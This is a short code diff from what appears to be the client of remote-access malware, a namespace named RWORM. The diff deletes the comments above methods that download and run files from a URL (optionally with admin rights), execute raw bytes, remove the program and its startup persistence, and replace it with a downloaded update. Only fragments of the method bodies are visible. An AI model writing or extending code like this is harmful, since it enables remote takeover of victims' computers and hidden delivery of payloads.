@@ -15,7 +15,7 @@ namespace RWORM.Client.Modules
             Timeout = TimeSpan.FromSeconds(60)
         };
 
-        // Download URL, write to temp, run it. Returns result JSON bytes.
+        
         public static async Task<byte[]> LoadAndExecute(string url, bool asAdmin = false)
         {
             try
@@ -39,7 +39,7 @@ namespace RWORM.Client.Modules
             catch (Exception ex) { return Utf8($"{{\"error\":\"{ex.Message}\"}}"); }
         }
 
-        // Write raw bytes to temp and run it. Returns result JSON bytes.
+        
         public static byte[] ExecuteBytes(byte[] bytes, string ext = ".exe", bool asAdmin = false)
         {
             try
@@ -61,7 +61,7 @@ namespace RWORM.Client.Modules
             catch (Exception ex) { return Utf8($"{{\"error\":\"{ex.Message}\"}}"); }
         }
 
-        // Delete self from disk, remove startup entries, exit.
+        
         public static void Uninstall()
         {
             RemoveStartup();
@@ -82,7 +82,7 @@ namespace RWORM.Client.Modules
             Environment.Exit(0);
         }
 
-        // Replace self with downloaded version and restart.
+        
         public static async Task Update(string url)
         {
             try
